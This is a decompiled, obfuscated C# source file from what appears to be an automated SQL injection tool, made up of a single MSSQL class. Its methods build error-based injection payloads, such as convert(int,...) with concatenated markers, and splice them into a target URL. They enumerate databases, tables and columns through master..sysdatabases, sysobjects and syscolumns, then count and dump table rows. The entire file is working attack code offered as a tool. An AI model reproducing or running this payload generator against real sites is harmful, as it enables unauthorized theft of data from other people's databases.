using System.Collections.Generic;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace DataBase;

public class MSSQL
{
	private static string string_0;

	private static string string_1;

	private static string smethod_0(InjectionType injectionType_0, bool bool_0)
	{
		if (injectionType_0 == InjectionType.Error)
		{
			if (bool_0)
			{
				return "convert(int,(%K%+(#)+%K%) COLLATE SQL_Latin1_General_Cp1254_CS_AS)";
			}
			return "convert(int,(%K%+(#)+%K%))";
		}
		return "(%K%+(#)+%K%)";
	}

	public static string Info(string sTraject, InjectionType oError, bool bCollateLatin, List<string> lColumn, string sCastType, string sEndUrl = "")
	{
		string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
		string newValue = Class23.smethod_21(Class54.string_0, bool_0: false);
		string text2 = Class23.smethod_21(Class54.string_2, bool_0: false);
		string text3 = smethod_0(oError, bCollateLatin);
		string text4 = "";
		checked
		{
			if (lColumn.Count == 1)
			{
				text4 = text.Replace("#", lColumn[0].Trim());
			}
			else
			{
				text4 = "select (";
				int num = lColumn.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (i > 0)
					{
						text4 = text4 + "+" + text2 + "+";
					}
					string text5 = text.Replace("#", lColumn[i].Trim());
					text4 += text5;
				}
				text4 += ") as t";
			}
			text3 = text3.Replace("%K%", newValue);
			text3 = text3.Replace("#", text4);
			text3 = Class23.smethod_7(text3);
			return sTraject.Replace("[t]", text3) + sEndUrl;
		}
	}

	public static string DataBases(string sTraject, InjectionType oError, bool bCorrentDB, string sCastType, bool bCollateLatin, int iDbId, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
	{
		string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
		string newValue = Class23.smethod_21(Class54.string_0, bool_0: false);
		string text2 = smethod_0(oError, bCollateLatin);
		text2 = text2.Replace("%K%", newValue);
		checked
		{
			if (bCorrentDB)
			{
				text2 = text2.Replace("#", text.Replace("#", "DB_NAME()"));
			}
			else if (string.IsNullOrEmpty(sWhere))
			{
				text2 = text2.Replace("#", "select distinct top 1 # from [master]..[sysdatabases] where [dbid]=" + Conversions.ToString(iDbId + 1));
			}
			else
			{
				string newValue2 = "isnull(#,char(32))";
				newValue2 = text.Replace("#", newValue2);
				newValue2 = newValue2.Replace("#", "[name]");
				text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select top 1 " + newValue2 + " from (select top %INDEX% [name] from [master]..[sysdatabases] where " + sWhere, Interaction.IIf(!string.IsNullOrEmpty(sOrderBy), " order by " + sOrderBy + ", [name] asc", " order by [name] asc")), ")"), "sq order by [name] desc")));
				text2 = text2.Replace("%INDEX%", Conversions.ToString(iDbId + 1));
			}
			text2 = text2.Replace("#", text.Replace("#", "[name]"));
			text2 = Class23.smethod_7(text2);
			return sTraject.Replace("[t]", text2) + sEndUrl;
		}
	}

	public static string Tables(string sTraject, string sDataBase, InjectionType oError, string sCastType, bool bCollateLatin, int iIndex, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
	{
		string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
		string newValue = Class23.smethod_21(Class54.string_0, bool_0: false);
		string text2 = smethod_0(oError, bCollateLatin);
		text2 = text2.Replace("%K%", newValue);
		text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select distinct top 1 # from [" + sDataBase + "]..[sysobjects] where id=(select top 1 id from (select distinct top " + Conversions.ToString(checked(iIndex + 1)) + " id from [" + sDataBase + "]..[sysobjects] where xtype=char(85) ", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), "order BY id ASC) "), " sq order BY id DESC)")));
		text2 = text2.Replace("#", text.Replace("#", "[name]"));
		text2 = Class23.smethod_7(text2);
		return sTraject.Replace("[t]", text2) + sEndUrl;
	}

	public static string Columns(string sTraject, string sDataBase, string sTable, InjectionType oError, string sCastType, bool bCollateLatin, int iIndex, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
	{
		string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
		string newValue = Class23.smethod_21(Class54.string_0, bool_0: false);
		string text2 = smethod_0(oError, bCollateLatin);
		text2 = text2.Replace("%K%", newValue);
		text2 = text2.Replace("#", Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select distinct top 1 # from [" + sDataBase + "]..[syscolumns] where id=(select id from [" + sDataBase + "]..[sysobjects] where [name]=%TB%) and [name] not in (select distinct top %INDEX% [name] from [" + sDataBase + "]..[syscolumns] where id=(select top 1 id from [" + sDataBase + "]..[sysobjects] where [name]=%TB%", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")"), ")")));
		text2 = text2.Replace("%TB%", Class23.smethod_21(sTable, bool_0: false));
		text2 = text2.Replace("%INDEX%", Conversions.ToString(iIndex));
		text2 = text2.Replace("#", text.Replace("#", "[name]"));
		text2 = Class23.smethod_7(text2);
		return sTraject.Replace("[t]", text2) + sEndUrl;
	}

	public static string Dump(string sTraject, string sDataBase, string sTable, List<string> lColumn, bool bIFNULL, InjectionType oError, string sCastType, bool bCollateLatin, int iIndex, int iAfectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndurl = "", string sCustomQuery = "", int iMSQLErrCIndex = -1)
	{
		bIFNULL = true;
		string text = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
		string text2 = Conversions.ToString(Interaction.IIf(bIFNULL, "isnull(#,char(" + Conversions.ToString(32) + "))", "#"));
		string newValue = Class23.smethod_21(Class54.string_0, bool_0: false);
		string text3 = Class23.smethod_21(Class54.string_2, bool_0: false);
		string text4 = smethod_0(oError, bCollateLatin);
		checked
		{
			if (string.IsNullOrEmpty(sCustomQuery))
			{
				string text5 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("select top 1 %cs% from(select top [x] %cl% from [%db%]..[%tb%] ", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", "where " + sWhere + " ")), "order by %cs2% asc"), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", "," + sOrderBy)), ") "), "sq order by %cs2% desc"));
				if (string.IsNullOrEmpty(sDataBase))
				{
					text5 = text5.Replace("[%db%]..", "");
				}
				string text6 = "";
				string text7 = "";
				text5 = text5.Replace("%cs2%", "[" + lColumn[0].Trim() + "]");
				if (lColumn.Count == 1)
				{
					text5 = text5.Replace("%cs%", text2.Replace("#", "[" + lColumn[0].Trim() + "]"));
					text5 = text5.Replace("%cl%", text2.Replace("#", "[" + lColumn[0].Trim() + "]"));
				}
				else
				{
					int num = lColumn.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (i > 0)
						{
							text6 = text6 + "+" + text3 + "+";
						}
						if (i > 0)
						{
							text7 += ",";
						}
						if (i == iMSQLErrCIndex)
						{
							text5 = text5.Replace("%cs%", text2.Replace("#", text.Replace("#", "[" + lColumn[i].Trim() + "]")));
							text6 = text6 + "[" + lColumn[i].Trim() + "]";
						}
						else
						{
							text6 += text.Replace("#", text2.Replace("#", text.Replace("#", "[" + lColumn[i].Trim() + "]")));
						}
						text7 = text7 + "[" + lColumn[i].Trim() + "]";
					}
					text5 = text5.Replace("%cs%", text6);
				}
				text5 = text5.Replace("%cl%", text7);
				text4 = text4.Replace("#", text5);
			}
			else
			{
				text4 = text4.Replace("#", sCustomQuery);
			}
			text4 = text4.Replace("%db%", sDataBase);
			text4 = text4.Replace("%tb%", sTable);
			text4 = text4.Replace("[s]", text3);
			text4 = text4.Replace("[x]", Conversions.ToString(iIndex + 1));
			text4 = text4.Replace("%K%", newValue);
			text4 = Class23.smethod_7(text4);
			return sTraject.Replace("[t]", text4) + sEndurl;
		}
	}

	public static string Count(string sTraject, InjectionType oError, string sCastType, bool bCollateLatin, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
	{
		Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(sCastType), "#", "cast(# as " + sCastType + ")"));
		string newValue = Class23.smethod_21(Class54.string_0, bool_0: false);
		Class23.smethod_21(Class54.string_2, bool_0: false);
		string text = smethod_0(oError, bCollateLatin);
		switch (o)
		{
		case Schema.DATABASES:
			text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [master]..[sysdatabases]", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere))));
			break;
		case Schema.TABLES:
			text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [" + sDataBase + "]..[sysobjects] where xtype=char(85)", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere))));
			break;
		case Schema.COLUMNS:
			text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [" + sDataBase + "]..[syscolumns] where id=(select id from  [" + sDataBase + "]..[sysobjects] where [name]=" + Class23.smethod_21(sTable, bool_0: false) + ")", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere))));
			break;
		case Schema.ROWS:
			text = text.Replace("#", Conversions.ToString(Operators.ConcatenateObject("select top 1 # from [" + sDataBase + "]..[" + sTable + "] ", Interaction.IIf(string.IsNullOrEmpty(sWhere), "", "where " + sWhere))));
			break;
		}
		text = text.Replace("#", "cast(count(*) as char)");
		text = text.Replace("%K%", newValue);
		text = Class23.smethod_7(text);
		return sTraject.Replace("[t]", text) + sEndUrl;
	}
}
